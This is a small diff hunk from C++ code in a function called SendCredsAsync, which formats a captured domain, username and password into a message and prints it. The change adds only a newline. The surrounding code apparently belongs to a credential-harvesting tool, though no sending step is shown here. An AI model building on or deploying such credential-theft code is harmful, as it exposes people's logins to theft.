@@ -119,7 +119,7 @@ DWORD SendCredsAsync(void* credsPtr)
     auto creds = credsBuf.Get<bang::Creds>();
 
     wchar_t msg[1024]{};
-    wsprintfW(msg, L"%s, %s, %s", creds->Domain, creds->User, creds->Password);
+    wsprintfW(msg, L"%s, %s, %s\n", creds->Domain, creds->User, creds->Password);
 
     DEBUG_PRINTW(L"%s\n", msg);
 
